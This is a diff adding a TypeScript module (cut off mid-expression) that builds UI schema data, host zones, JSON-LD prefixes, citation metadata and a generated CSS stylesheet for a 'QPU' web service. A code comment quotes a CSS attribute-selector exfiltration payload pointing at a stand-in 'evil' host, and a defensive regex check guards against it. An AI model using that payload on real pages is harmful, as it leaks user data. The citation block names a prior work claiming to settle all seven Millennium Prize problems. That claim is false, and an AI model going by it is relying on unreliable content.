@@ -1,0 +1,923 @@
+// Cooled out of index.ts by the heat family (scripts/cool.mjs): qpuGenesisOf, qpuPentagramOf, qpuAccessOf, qpuHologramOf, qpuZoneOf, qpuZoneHostOf, qpuTenantZoneOf, qpuSchemasOf, qpuCiteOf, qpuPresenceOf, qpuCssOf, qpuReflectOf, qpuRobotsOf, qpuSeoZoneOf.
+import {
+  QPU_ZONE_HOSTS,
+  coins,
+  cors,
+  faceOf,
+  messageLanes,
+  mintOf,
+  n,
+  occupancies,
+  onceOf,
+  qpuCernExperimentsOf,
+  qpuContextOf,
+  qpuHostsOf,
+  qpuPentagramHolds,
+  qpuSeatHandleOf,
+  qpuSeoZoneHolds,
+  qpuStepsOf,
+  raidClouds,
+  raidTypesOf,
+  schemaOrg,
+  seed,
+  seoZoneFieldsOf,
+  skills,
+  storageHref,
+  ten,
+  theorem,
+  unit,
+} from './index.js'
+import { packageVersion } from './version.js'
+import { qpuCircuitOf } from './circuit.js'
+import { qpuLeanOf, qpuLeanHolds } from './proof.js'
+import { qpuQuantumOf, qpuQuantumHolds } from './quantum.js'
+import { chooseOf, tenOf, qpuCubeOf, qpuHandleOf, qpuFacesOf } from './lattice.js'
+
+/**
+ * The UI schema: shadcn card variants, sizes, states and themes seated on the lattice's faces and rays, served as data (no HTML).
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuGenesisHolds
+ */
+export const qpuGenesisOf = onceOf(() => {
+  const faces = qpuFacesOf()
+  const hz = 432
+  const card = ['card', 'card-header', 'card-title', 'card-description', 'card-action', 'card-content', 'card-footer'] as const
+  const alpine = [...card, 'badge', 'button', 'input'] as const
+  const variants = ['default', 'destructive', 'outline', 'secondary', 'ghost', 'link'] as const
+  const sizes = ['default', 'xs', 'sm', 'lg', 'icon', 'icon-xs', 'icon-sm', 'icon-lg'] as const
+  const state = ['open', 'closed'] as const
+  const element = ['self', 'child'] as const
+  const theme = ['light', 'dark'] as const
+  const domains = ['scanner', 'radar'] as const
+  const keys = ['slot', 'variant', 'size', 'state', 'element', 'theme'] as const
+  const frameworks = [
+    'shadcn',
+    'radix',
+    'react',
+    'vue',
+    'svelte',
+    'alpine',
+    'vitepress',
+    'payload',
+    'tailwind',
+    'cva',
+    'panda',
+    'vanilla-extract',
+    'html',
+    'qpu'] as const
+  const product = variants.length * sizes.length * (n * n)
+  const chooseN = chooseOf(n, coins)
+  const chooseRays = chooseOf(faces.rays, coins)
+  const nodes = frameworks.map((name, face) => {
+    const hop = (face + faces.rays + faces.rays) % faces.faces
+    const ray = face % faces.rays
+    const team = (face - ray) / faces.rays
+    const involution = hop === face
+    return {
+      face,
+      hop,
+      ray,
+      team,
+      involution,
+      name,
+      schema: 'shadcn' as const,
+      domain: domains[team]!,
+      slot: card[ray]!,
+      holds: involution,
+  }
+  })
+  let occupied = n - n
+  for (const node of nodes) if (node.holds) occupied += seed
+  const vacant = nodes.length - occupied
+  const schema = {
+    kind: 'schema' as const,
+    name: 'shadcn' as const,
+    keys,
+    slot: card,
+    variant: variants,
+    size: sizes,
+    state,
+    element,
+    theme,
+    hz,
+    holds:
+      keys.length === coins * n &&
+      card.length === faces.rays &&
+      variants.length === coins * n &&
+      sizes.length === mintOf(n) &&
+      state.length === coins &&
+      element.length === coins &&
+      theme.length === coins &&
+      domains.length === coins}
+  const holds =
+    schema.holds &&
+    product === hz &&
+    coins * n * mintOf(n) * (n * n) === hz &&
+    alpine.length === ten &&
+    chooseN === n &&
+    chooseRays === n * faces.rays &&
+    chooseOf(n, n - n) === seed &&
+    chooseOf(n, n) === seed &&
+    frameworks.length === faces.faces &&
+    nodes.length === faces.faces &&
+    occupied === faces.faces &&
+    vacant === n - n &&
+    theorem.around(faces.faces, coins, faces.rays) &&
+    nodes.every((node) => node.holds && node.schema === 'shadcn')
+  return {
+    kind: 'genesis' as const,
+    '@type': 'DigitalDocument' as const,
+    hz,
+    schema,
+    card,
+    alpine,
+    variants,
+    sizes,
+    state,
+    element,
+    theme,
+    domains,
+    keys,
+    frameworks,
+    nodes,
+    occupied,
+    vacant,
+    choose: { n: chooseN, rays: chooseRays },
+    product,
+    slots: card.length,
+    framework: 'shadcn' as const,
+    scope: 'all' as const,
+    known: frameworks.length,
+    holds,
+  }
+})
+
+/**
+ * The occupancy pentagram: five occupancies x five skills joined in a single stroke of step 2.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuPentagramHolds
+ */
+export const qpuPentagramOf = onceOf(() => {
+  const points = n + coins
+  const stroke: number[] = []
+  let x = n - n
+  for (let i = n - n; i < points; i++) {
+    stroke.push(x)
+    x = (x + coins) % points
+  }
+  const unique: number[] = []
+  for (const face of stroke) if (!unique.includes(face)) unique.push(face)
+  const nodes = occupancies.map((occupancy, face) => ({
+    face,
+    hop: stroke[face]!,
+    occupancy,
+    skill: skills[face]!,
+    rank: face,
+    holds: occupancy === occupancies[face],
+  }))
+  const holds =
+    occupancies.length === points &&
+    skills.length === points &&
+    stroke.length === points &&
+    unique.length === points &&
+    nodes.length === points &&
+    stroke[n - n] === n - n &&
+    stroke[seed] === coins &&
+    points === n + coins
+  return {
+    kind: 'pentagram' as const,
+    theorem: 'pentagram' as const,
+    points,
+    step: coins,
+    occupancies,
+    skills,
+    stroke,
+    nodes,
+    single: unique.length === points,
+    holds,
+  }
+})
+
+/**
+ * Access keys (domain, occupancy) for every occupancy, with their fused names.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuAccessHolds
+ */
+export const qpuAccessOf = onceOf(() => {
+  const pentagram = qpuPentagramOf()
+  const keys = ['domain', 'handle'] as const
+  const holds = keys.length === coins && keys[n - n] === 'domain' && keys[seed] === 'handle' && pentagram.holds && qpuPentagramHolds(pentagram)
+  return {
+    kind: 'access' as const,
+    keys,
+    occupancies: pentagram.occupancies,
+    holds,
+  }
+})
+
+/**
+ * The 'hologram' reading: the pentagram and access readings composed with the fused capacity and the STORAGE/BLOBS bindings.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuHologramHolds
+ */
+export const qpuHologramOf = onceOf(() => {
+  const faces = qpuFacesOf()
+  const cube = qpuCubeOf()
+  const handle = qpuHandleOf()
+  const pentagram = qpuPentagramOf()
+  const access = qpuAccessOf()
+  const genesis = qpuGenesisOf()
+  const fused = faces.faces * handle.kv.amplitudes
+  const scales = [
+    { name: 'occupancy' as const, parts: pentagram.occupancies.length, fused },
+    { name: 'skill' as const, parts: pentagram.skills.length, fused },
+    { name: 'access' as const, parts: access.keys.length, fused },
+    { name: 'mcp' as const, parts: mintOf(n), fused },
+    { name: 'faces' as const, parts: faces.faces, fused }] as const
+  const fractal = scales.every((row) => row.fused === fused && row.parts > n - n)
+  const holds =
+    pentagram.holds &&
+    access.holds &&
+    genesis.holds &&
+    fractal &&
+    scales.length === n + coins &&
+    fused === faces.faces * mintOf(cube.bits + seed) &&
+    pentagram.skills.includes('hologram') &&
+    pentagram.skills.includes('payload') &&
+    pentagram.skills.includes('network')
+  return {
+    kind: 'hologram' as const,
+    fractal,
+    theorem: 'fusion' as const,
+    pentagram,
+    access,
+    scales,
+    hz: genesis.hz,
+    fused,
+    next: fused + fused,
+    faces: faces.faces,
+    tools: mintOf(n),
+    holds,
+  }
+})
+
+/**
+ * The zone with each first-party host resolved from its label — the apex carries the empty label and is the zone.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuZoneHolds
+ */
+export const qpuZoneOf = onceOf(() => {
+  const zone = unit.host.split('.').slice(seed).join('.')
+  const hosts = QPU_ZONE_HOSTS.map((h) => {
+    const host = h.label === '' ? zone : `${h.label}.${zone}`
+    return { ...h, host, origin: `https://${host}`, apex: h.label === '', own: host === unit.host }
+  })
+  return { zone, hosts, labels: hosts.filter((h) => !h.apex).map((h) => h.label) }
+})
+
+/**
+ * The first-party host this request landed on, or undefined — and `qpu: false` is as good as absent here.
+ *
+ * THE APEX IS IN THE TABLE AND OUT OF THIS UNIT'S REACH, which is not a contradiction: the table states what the
+ * zone IS, and this lookup answers what this unit is ROUTED to. uuidna.com holds its own custom domain and this
+ * worker has no route there — it answers on qpu.uuidna.com and on the *.uuidna.com wildcard, which the apex is
+ * not under. Computing a crawlable pair for it produced a sitemap listing a root this unit answers 404 for, and
+ * the apex already serves its own robots.txt and its own 11,438-URL sitemap from the worker that does hold it.
+  * @wing presentation
+  * @kind builder
+  * @evidence qpuZoneHostHolds
+ */
+export const qpuZoneHostOf = (host: unknown) =>
+  qpuZoneOf().hosts.find((h) => h.qpu && h.host === String(host ?? '').toLowerCase())
+
+/** The tenant zone QPU serves and the labels in it that are never a tenant — one declaration, read by the router and
+ *  by Payload (src/access.ts), never restated there. The zone is this unit's host minus its first label; that label is
+  * @wing presentation
+  * @kind builder
+  * @evidence qpuTenantZoneHolds
+ *  this unit, and www is reserved because the router redirects it to the zone's apex. */
+export const qpuTenantZoneOf = onceOf(() => {
+  const labels = unit.host.split('.')
+  const own = labels[n - n]!
+  return { zone: labels.slice(seed).join('.'), own, www: 'www' as const, reserved: [own, 'www', 'saas-fallback'] as readonly string[] }
+})
+
+/**
+ * The JSON-LD schemas the unit serves, mounted under storage, with their prefixes and context.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuSchemasHolds
+ */
+export const qpuSchemasOf = onceOf(() => {
+  const cube = qpuCubeOf()
+  const faces = qpuFacesOf()
+  const hosts = qpuHostsOf()
+  const types = raidTypesOf(faces)
+  const named = [
+    { name: 'schema', href: `${schemaOrg}/` },
+    { name: 'qpu', href: `${unit.href}#` },
+    { name: 'mcp', href: 'https://modelcontextprotocol.io/' },
+    { name: 'lean', href: 'https://lean-lang.org/' },
+    { name: 'cern', href: 'https://opendata.cern.ch/' },
+    { name: 'inspire', href: 'https://inspirehep.net/' },
+    { name: 'spdx', href: 'https://spdx.org/licenses/' },
+    { name: 'dc', href: 'http://purl.org/dc/terms/' },
+    { name: 'jsonld', href: 'https://www.w3.org/ns/json-ld#' },
+    { name: 'hydra', href: 'https://www.w3.org/ns/hydra/core#' },
+    { name: 'uuid', href: 'https://www.rfc-editor.org/rfc/rfc9562' },
+    { name: 'zenodo', href: 'https://zenodo.org/' },
+    { name: 'hepdata', href: 'https://www.hepdata.net/' },
+    { name: 'cc', href: 'https://creativecommons.org/licenses/by-nc-nd/4.0/' }] as const
+  const keys = ['inputSchema', 'input_schema', 'parameters'] as const
+  const rows = named.map((row, face) => {
+    const hop = (face + faces.rays + faces.rays) % faces.faces
+    const host = hosts.nodes[face]!
+    const part = face < cube.vertices ? 'vertex' : face < cube.vertices + cube.hexbit ? 'hexbit' : 'coin'
+    return {
+      name: row.name,
+      href: row.href,
+      face,
+      hop,
+      involution: hop === face,
+      prefix: row.name,
+      part,
+      merge: 'storage' as const,
+      storage: storageHref,
+      raid: types[face]!.name,
+      cloud: raidClouds[face]!.name,
+      llm: host.llm,
+      call: host.call,
+      result: host.result,
+      schema: host.schema,
+      keys,
+      holds: hop === face && row.href.length > n - n && host.holds,
+  }
+  })
+  const prefixes = {
+    schema: named[n - n]!.href,
+    qpu: named[seed]!.href,
+    mcp: named[coins]!.href,
+    lean: named[n]!.href,
+    cern: named[n + seed]!.href,
+    inspire: named[n + coins]!.href,
+    spdx: named[n + n]!.href,
+    dc: named[mintOf(n) - seed]!.href,
+    jsonld: named[mintOf(n)]!.href,
+    hydra: named[mintOf(n) + seed]!.href,
+    uuid: named[ten]!.href,
+    zenodo: named[ten + seed]!.href,
+    hepdata: named[ten + coins]!.href,
+    cc: named[faces.faces - seed]!.href} as const
+  const context = [schemaOrg, prefixes] as const
+  let occupied = n - n
+  for (const row of rows) if (row.holds) occupied += seed
+  const vacant = rows.length - occupied
+  const efficiency = {
+    kind: 'efficiency' as const,
+    context: context.length,
+    mounted: rows.length,
+    ratio: faces.rays,
+    tokens: 'four bytes' as const,
+    holds: context.length === coins && rows.length === faces.faces && rows.length === coins * faces.rays,
+  }
+  const compatibility = {
+    kind: 'compatibility' as const,
+    keys,
+    harnesses: hosts.harnesses.length,
+    llms: hosts.llms.length,
+    holds: hosts.holds && keys.length === n && rows.every((row) => row.keys.length === n),
+  }
+  const holds =
+    faces.holds &&
+    hosts.holds &&
+    rows.length === faces.faces &&
+    occupied === faces.faces &&
+    vacant === n - n &&
+    context.length === coins &&
+    context[n - n] === schemaOrg &&
+    prefixes.qpu === `${unit.href}#` &&
+    prefixes.schema === `${schemaOrg}/` &&
+    rows.every((row) => row.holds && row.involution && row.merge === 'storage') &&
+    efficiency.holds &&
+    compatibility.holds &&
+    cube.vertices + cube.hexbit + coins === faces.faces
+  return {
+    kind: 'schemas' as const,
+    mounted: occupied,
+    vacant,
+    merge: 'storage' as const,
+    href: storageHref,
+    rows,
+    prefixes,
+    context,
+    efficiency,
+    compatibility,
+    holds,
+  }
+})
+
+/**
+ * How to cite the unit (MLA 8): DOI, concept DOI, ORCID, archived version and commit, served version, and whether they match.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuCiteHolds
+ */
+export const qpuCiteOf = onceOf(() => {
+  const lean = qpuLeanOf()
+  const quantum = qpuQuantumOf()
+  const author = {
+    last: 'Rouschev',
+    first: 'Tsvetan',
+    orcid: 'https://orcid.org/0009-0000-7312-9778',
+  }
+  /** THE VERSIONED DOI, AND IT MUST NAME THIS VERSION. Zenodo mints one per GitHub Release from the concept
+   *  record below; this is the one it minted for v0.1.3. It said v0.1.1 while the package shipped 0.1.3 — a
+   *  citation that sends a reader to an artefact two releases behind what it claims to describe. verify-release
+   *  checks the archive holds the version being released, which is what caught it. */
+  const doi = '10.5281/zenodo.23091364'
+  const conceptdoi = '10.5281/zenodo.22700098'
+  const archive = `https://zenodo.org/records/23091364`
+  const identifier = `https://doi.org/${doi}`
+  const prior = {
+    title: 'All Seven Clay Millennium Problems Sealed via Universal σ-Involution',
+    doi: '10.5281/zenodo.21781603',
+    conceptdoi: '10.5281/zenodo.21781602',
+    archive: 'https://zenodo.org/records/21781603',
+  } as const
+  const sameAs = [archive, author.orcid, identifier] as const
+  /** WHAT THE ARCHIVE HOLDS, BESIDE WHAT THE HOST SERVES. The versioned DOI is one archived commit; the host moves on
+   * without it until a new version is archived. Both are said, and `current` says whether they are the same version,
+   * so a reader who downloads "this version" knows whether it is the code that answered them. */
+  const archived = { doi, archive, version: '1.0.0' as string, commit: '50eace7', holds: archive.endsWith(doi.split('.').pop() ?? '') }
+  const served = { version: packageVersion, origin: unit.origin, holds: /^1\.(0|[1-9][0-9]*)\.[0-9]$/.test(packageVersion) }
+  const current = archived.version === served.version
+  const currency = current
+    ? `the archive is this version: v${served.version} at ${archived.commit}.`
+    : `the archive is behind the host: it holds v${archived.version} at ${archived.commit}; the host serves v${served.version}. Cite the archive for what it holds; the concept DOI ${conceptdoi} resolves to the latest archived version.`
+  const website = unit.host
+  const mcp = `${unit.origin}/mcp`
+  const worksOf = (title: string, url: string, workDoi = doi, container = website): string =>
+    `${author.last}, ${author.first}. ORCID ${author.orcid}. "${title}." ${container}, ${url}. doi:${workDoi}.`
+  const priorWorks = worksOf(prior.title, prior.archive, prior.doi, 'Zenodo')
+  const rows = [
+    { title: unit.kind, url: unit.origin, doi, works: worksOf(unit.kind, unit.origin), holds: unit.origin.startsWith('https://') && unit.kind.length > n - n },
+    { title: 'quantum processing unit', url: unit.href, doi, works: worksOf('quantum processing unit', unit.href), holds: unit.href.startsWith('https://') },
+    { title: lean.src, url: mcp, doi, works: worksOf(lean.src, mcp), holds: mcp.startsWith(unit.origin) && lean.src.endsWith('/index.lean') }] as const
+  const holds =
+    qpuLeanHolds(lean) &&
+    qpuQuantumHolds(quantum) &&
+    author.last.length > n - n &&
+    author.orcid.startsWith('https://orcid.org/') &&
+    author.orcid.endsWith('0009-0000-7312-9778') &&
+    doi.startsWith('10.5281/zenodo.') &&
+    archived.holds &&
+    conceptdoi.endsWith('22700098') &&
+    prior.doi.endsWith('21781603') &&
+    prior.archive.startsWith('https://zenodo.org/records/') &&
+    priorWorks.includes(`doi:${prior.doi}`) &&
+    priorWorks.includes('Zenodo, ') &&
+    archive.startsWith('https://zenodo.org/records/') &&
+    website === unit.host &&
+    rows.length === n &&
+    identifier === `https://doi.org/${doi}` &&
+    sameAs.includes(archive) &&
+    sameAs.includes(author.orcid) &&
+    rows.every(
+      (r) =>
+        r.holds === true &&
+        r.doi === doi &&
+        r.works.startsWith(`${author.last}, ${author.first}. ORCID ${author.orcid}. "`) &&
+        r.works.includes(`doi:${doi}`) &&
+        r.url.startsWith(unit.origin) &&
+        !r.url.includes('*'))
+  return {
+    '@context': qpuContextOf(),
+    '@type': 'CreativeWork' as const,
+    '@id': `${unit.origin}/cite`,
+    url: `${unit.origin}/cite`,
+    isAccessibleForFree: cors === '*',
+    kind: 'cite' as const,
+    style: 'mla8' as const,
+    source: 'website' as const,
+    when: 'never' as const,
+    author,
+    website,
+    href: unit.origin,
+    doi,
+    conceptdoi,
+    archive,
+    identifier,
+    sameAs,
+    prior: { ...prior, works: priorWorks },
+    archived,
+    served,
+    current,
+    currency,
+    inText: `(${author.last})`,
+    rows,
+    holds,
+  }
+})
+
+/**
+ * Presence of users per face (active, inactive, chatting) with starter templates, merged into storage.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuPresenceHolds
+ */
+export const qpuPresenceOf = onceOf(() => {
+  const cube = qpuCubeOf()
+  const isolate = qpuHandleOf()
+  const faces = qpuFacesOf()
+  const circuit = qpuCircuitOf()
+  const hosts = qpuHostsOf()
+  const schemas = qpuSchemasOf()
+  const types = raidTypesOf(faces)
+  const fused = faces.faces * isolate.kv.amplitudes
+  if (messageLanes.length !== faces.faces) {
+    messageLanes.length = n - n
+    for (let i = n - n; i < faces.faces; i++) messageLanes.push([])
+  }
+  const users = circuit.lattice.nodes.map((node) => {
+    const handle = qpuSeatHandleOf(node.face)
+    const host = hosts.nodes[node.face]!
+    const schema = schemas.rows[node.face]!
+    const messages = messageLanes[node.face]!.length
+    const chatting = messages > n - n
+    return {
+      '@id': handle['@id'],
+      handle,
+      face: node.face,
+      hop: node.hop,
+      involution: node.involution,
+      active: node.holds,
+      inactive: node.holds === false,
+      chatting,
+      messages,
+      phenomenon: node.name,
+      llm: host.llm,
+      schema: schema.name,
+      raid: types[node.face]!.name,
+      cloud: raidClouds[node.face]!.name,
+      merge: 'storage' as const,
+      holds: handle.holds && node.holds && host.holds && schema.holds,
+  }
+  })
+  let active = n - n
+  let inactive = n - n
+  let chatting = n - n
+  for (const user of users) {
+    if (user.active) active += seed
+    else inactive += seed
+    if (user.chatting) chatting += seed
+  }
+  const templates = [
+    {
+      name: 'next-starter-template' as const,
+      href: 'https://github.com/cloudflare/templates/tree/main/next-starter-template',
+      binding: 'Static assets' as const,
+      door: unit.origin},
+    {
+      name: 'multiplayer-globe-template' as const,
+      href: 'https://github.com/cloudflare/templates/tree/main/multiplayer-globe-template',
+      binding: 'Durable Objects' as const},
+    {
+      name: 'durable-chat-template' as const,
+      href: 'https://github.com/cloudflare/templates/tree/main/durable-chat-template',
+      binding: 'Durable Objects' as const,
+      durable: 'storage' as const}] as const
+  const starter = {
+    kind: 'starter' as const,
+    template: templates[n - n]!.name,
+    href: templates[n - n]!.href,
+    door: unit.origin,
+    type: 'SoftwareApplication' as const,
+    holds: templates[n - n]!.name === 'next-starter-template',
+  }
+  const globe = {
+    kind: 'globe' as const,
+    template: templates[seed]!.name,
+    href: templates[seed]!.href,
+    holds: users.every((user) => user.merge === 'storage'),
+  }
+  const chat = {
+    kind: 'chat' as const,
+    template: templates[coins]!.name,
+    href: templates[coins]!.href,
+    durable: 'storage' as const,
+    holds: chatting >= n - n && users.every((user) => user.merge === 'storage'),
+  }
+  const holds =
+    cube.holds &&
+    isolate.holds &&
+    faces.holds &&
+    circuit.lattice.holds &&
+    hosts.holds &&
+    schemas.holds &&
+    users.length === faces.faces &&
+    active === circuit.lattice.occupied &&
+    inactive === circuit.lattice.vacant &&
+    templates.length === n &&
+    starter.holds &&
+    globe.holds &&
+    chat.holds &&
+    users.every((user) => user.holds && user.handle.id.length === mintOf(n))
+  return {
+    kind: 'presence' as const,
+    templates,
+    starter,
+    globe,
+    chat,
+    users,
+    active,
+    inactive,
+    chatting,
+    faces: faces.faces,
+    fused,
+    next: fused + fused,
+    merge: 'storage' as const,
+    holds,
+  }
+})
+
+/**
+ * The fused stylesheet the unit serves (qpu.css), with its size against the naive stylesheet.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuCssHolds
+ */
+export const qpuCssOf = (imagine = '', genesis = qpuGenesisOf()) => {
+  const faces = qpuFacesOf()
+  const circuit = qpuCircuitOf()
+  const milli = tenOf(n)
+  const hz = genesis.hz
+  const sat = ten * n * coins + coins * n
+  const light = ten * n + ten + mintOf(n) + coins
+  const mid = (ten * ten) / coins
+  const none = n - n
+  const seated = imagine.length > none ? faceOf(imagine, faces.faces) : none
+  const hop = (seated + faces.rays + faces.rays) % faces.faces
+  /** LATTICE PHASE (the captain, 2026-09-12: "re-fuse all animations to follow the quantum lattice"). Every face keeps
+   * the one fused keyframe, but its phase is its position on the genesis walk (0, 7, 1, 8, … 6, 13): ray 0's scanner
+   * face, its radar face by the hop, the next ray. One negative animation-delay rule reads `--walk`, and the timing
+   * function steps once per face, so the grid is the walk itself, not fourteen faces pulsing in line. */
+  const walkOf = (face: number) => (face % faces.rays) * coins + (face < faces.rays ? none : seed)
+  const walk = qpuStepsOf().walk.map((step) => step.face)
+  const physicsOf = (name: string) => {
+    if (name === 'split') return { x: none, y: none, r: none, s: coins, a: seed }
+    if (name === 'entangle') return { x: coins, y: none, r: none, s: seed, a: seed }
+    if (name === 'interfere') return { x: none, y: none, r: none, s: seed, a: none }
+    if (name === 'ghz') return { x: none, y: none, r: none, s: n, a: seed }
+    if (name === 'noclone') return { x: none, y: none, r: none, s: seed, a: seed }
+    if (name === 'teleport') return { x: faces.rays, y: none, r: none, s: seed, a: seed }
+    if (name === 'kickback') return { x: none, y: none, r: mintOf(coins + coins), s: seed, a: seed }
+    if (name === 'deutsch') return { x: none, y: none, r: none, s: seed, a: seed }
+    if (name === 'dense') return { x: none, y: none, r: none, s: coins, a: seed }
+    if (name === 'monogamy') return { x: coins, y: none, r: none, s: seed, a: seed }
+    if (name === 'qubits') return { x: none, y: none, r: none, s: n, a: seed }
+    if (name === 'gates') return { x: coins, y: none, r: none, s: seed, a: seed }
+    if (name === 'measurement') return { x: none, y: none, r: none, s: seed, a: seed }
+    if (name === 'register') return { x: none, y: ten, r: none, s: seed, a: seed }
+    return { x: none, y: none, r: none, s: seed, a: seed }
+  }
+  const quantumRows = circuit.lattice.nodes.map((node) => ({
+    name: node.name,
+    face: node.face,
+    quantum: node.holds,
+    imagine: imagine.length > none && node.face === seated,
+    theorem: `theorem ${node.name}`,
+    holds: node.holds,
+    vars: physicsOf(node.name)}))
+  const entangled = qpuCernExperimentsOf()
+  const hepRows = entangled.nodes.map((node) => ({
+    name: node.name,
+    face: node.face,
+    domain: node.domain,
+    hop: node.hop,
+    quantum: node.holds,
+    imagine: imagine.length > none && node.face === seated,
+    theorem: 'theorem entangle' as const,
+    partner: node.partner.name,
+    entangled: node.quantum.name,
+    product: node.product,
+    holds: node.holds,
+    vars: physicsOf('entangle')}))
+  const experiments = [...quantumRows, ...hepRows]
+  /** THE OTHER FIVE KEYS. genesis declares six — slot, variant, size, state, element, theme — and computes their
+   * product as variants * sizes * (n * n) = 432 = hz, the frequency this whole sheet is timed to. Only `slot` was
+   * ever emitted, so five sixths of the schema was a number the unit could state and not a rule a browser could
+   * apply.
+   *
+   * EACH MEMBER IS SEATED BY ITS INDEX, which is what makes this combinatorial rather than a list. A sheet that
+   * named every combination would be variants * sizes * state * element * theme rules and would have to grow by
+   * multiplication whenever a key gained a member; this grows by addition, and the consumer reads --qpu-v and
+   * --qpu-z and composes the product itself. state is the exception and deliberately so: --qpu-a is already the
+   * registered opacity property, and open/closed is exactly what opacity means here.
+   *
+   * No rule below can initiate a request. That is the one property a publicly served, CORS-* stylesheet must
+   * have, and it is checked in holds rather than left to whoever edits this next. */
+  const keyed =
+    genesis.variants.map((name, k) => `[data-variant=${name}]{--qpu-v:${k}}`).join('') +
+    genesis.sizes.map((name, k) => `[data-size=${name}]{--qpu-z:${k}}`).join('') +
+    genesis.state.map((name, k) => `[data-state=${name}]{--qpu-a:${k === none ? seed : none}}`).join('') +
+    genesis.element.map((name, k) => `[data-element=${name}]{--qpu-e:${k}}`).join('') +
+    genesis.theme.map((name, k) => `[data-theme=${name}]{--qpu-t:${k}}`).join('')
+
+  const engine =
+    `@layer qpu{` +
+    `@property --qpu-x{syntax:"<length>";inherits:false;initial-value:${none}px}` +
+    `@property --qpu-y{syntax:"<length>";inherits:false;initial-value:${none}px}` +
+    `@property --qpu-r{syntax:"<angle>";inherits:false;initial-value:${none}deg}` +
+    `@property --qpu-s{syntax:"<number>";inherits:false;initial-value:${seed}}` +
+    `@property --qpu-a{syntax:"<number>";inherits:false;initial-value:${seed}}` +
+    `:root{--qpu-hz:${hz};--qpu-n:${n};--qpu-coins:${coins};--qpu-rays:${faces.rays};--qpu-faces:${faces.faces};--qpu-milli:${milli};--qpu-period:calc(1s * var(--qpu-milli) / var(--qpu-hz))}` +
+    `.qpu{display:grid;grid-template-columns:repeat(var(--qpu-rays),minmax(0,1fr))}` +
+    `.qpu>*{aspect-ratio:${seed};color:hsl(calc(var(--qpu-hz) * var(--face,${none}) / var(--qpu-faces)) ${sat}% ${light}%);animation:qpu var(--qpu-period) steps(var(--qpu-faces),jump-none) infinite;animation-delay:calc(${none - seed} * var(--qpu-period) * var(--walk,${none}) / var(--qpu-faces));will-change:transform,opacity}` +
+    `.qpu>*::after{content:attr(data-qpu)}` +
+    `.qpu>[data-imagine]{--qpu-s:${coins}}` +
+    genesis.card.map((slot) => `[data-slot=${slot}]{display:grid}`).join('') +
+    keyed +
+    genesis.nodes.map((node) => `[data-framework=${node.name}][data-domain=${node.domain}]{--face:${node.face};--walk:${walkOf(node.face)}}`).join('') +
+    `[data-slot=card-header]:has([data-slot=card-action]){grid-template-columns:minmax(0,1fr) auto}` +
+    `@keyframes qpu{${mid}%{transform:translate3d(var(--qpu-x),var(--qpu-y),0) rotate(var(--qpu-r)) scale(var(--qpu-s));opacity:var(--qpu-a)}}` +
+    `@media (prefers-reduced-motion:reduce){.qpu>*{animation:none;will-change:auto}}` +
+    `}`
+  const naive = experiments
+    .map((row) => `@keyframes qpu-${row.name}{${mid}%{transform:scale(${row.vars.s});opacity:${row.vars.a}}}.${row.name}{animation:qpu-${row.name} var(--qpu-period) linear infinite}`)
+    .join('')
+  const cover = faces.faces * coins
+  const fusedBytes = engine.length
+  const naiveBytes = (engine + naive).length
+  const keyframes = seed
+  const animate = ['transform', 'opacity'] as const
+  const holds =
+    genesis.holds &&
+    circuit.lattice.holds &&
+    entangled.holds &&
+    experiments.length === cover &&
+    experiments.length === faces.faces + faces.faces &&
+    quantumRows.length === faces.faces &&
+    hepRows.length === faces.faces &&
+    hepRows.every((row) => row.quantum && row.product === (seed * seed === none * none) && (row.domain === genesis.domains[n - n] || row.domain === genesis.domains[seed])) &&
+    fusedBytes < naiveBytes &&
+    keyframes === seed &&
+    animate.length === coins &&
+    !engine.includes('#') &&
+    engine.includes('transform') &&
+    engine.includes('opacity') &&
+    engine.includes('@keyframes qpu{') &&
+    engine.includes('card-action') &&
+    // EVERY KEY genesis DECLARES IS A RULE A BROWSER CAN APPLY, not a count the unit can state. Asked per member
+    // rather than per key, because a key that emitted its first member and dropped the rest would satisfy any
+    // check that only asked whether the key appears.
+    genesis.variants.every((name) => engine.includes(`[data-variant=${name}]`)) &&
+    genesis.sizes.every((name) => engine.includes(`[data-size=${name}]`)) &&
+    genesis.state.every((name) => engine.includes(`[data-state=${name}]`)) &&
+    genesis.element.every((name) => engine.includes(`[data-element=${name}]`)) &&
+    genesis.theme.every((name) => engine.includes(`[data-theme=${name}]`)) &&
+    /**
+     * CSS EXFILTRATES WITHOUT JAVASCRIPT — learned from @uuidna/school, which states it best: an attribute
+     * selector paired with a request, `[data-x^="a"]{background:url(https://evil/a)}`, leaks a value one
+     * character per request, and a policy that permits scripts while forgetting images does nothing about it.
+     * This sheet is about to be served publicly under CORS *, so it must initiate no request of any kind.
+     *
+     * WHERE THE TWO PACKAGES CROSS, THE CHECK GETS STRONGER THAN EITHER. school's stylesheet is written by hand
+     * and its tests scan the text, which is the best a fixed string allows. This one is GENERATED from a closed
+     * alphabet — the six keys' declared members, the fourteen frameworks, the two domains — so the property is
+     * decidable rather than sampled: every attribute value emitted is checked to be one genesis declares, and a
+     * value from anywhere else cannot reach the sheet to carry a URL in the first place. The request check below
+     * then has nothing left to find, which is the point of it.
+     */
+    [...engine.matchAll(/\[data-(?:slot|variant|size|state|element|theme|framework|domain)=([^\]]+)\]/g)].every(
+      ([, value]) =>
+        (genesis.card as readonly string[]).includes(value) ||
+        (genesis.variants as readonly string[]).includes(value) ||
+        (genesis.sizes as readonly string[]).includes(value) ||
+        (genesis.state as readonly string[]).includes(value) ||
+        (genesis.element as readonly string[]).includes(value) ||
+        (genesis.theme as readonly string[]).includes(value) ||
+        (genesis.frameworks as readonly string[]).includes(value) ||
+        (genesis.domains as readonly string[]).includes(value)) &&
+    /url\(|@import|image-set|element\(/.test(engine) === false &&
+    engine.includes('data-framework=shadcn') &&
+    engine.includes('data-domain=scanner') &&
+    engine.includes('data-domain=radar') &&
+    genesis.frameworks.every((name) => engine.includes(`data-framework=${name}`)) &&
+    engine.includes(`--qpu-hz:${hz}`) &&
+    engine.split('animation-delay').length === coins &&
+    engine.includes('--walk') &&
+    engine.includes('linear') === false &&
+    walk.length === faces.faces &&
+    new Set(walk).size === faces.faces &&
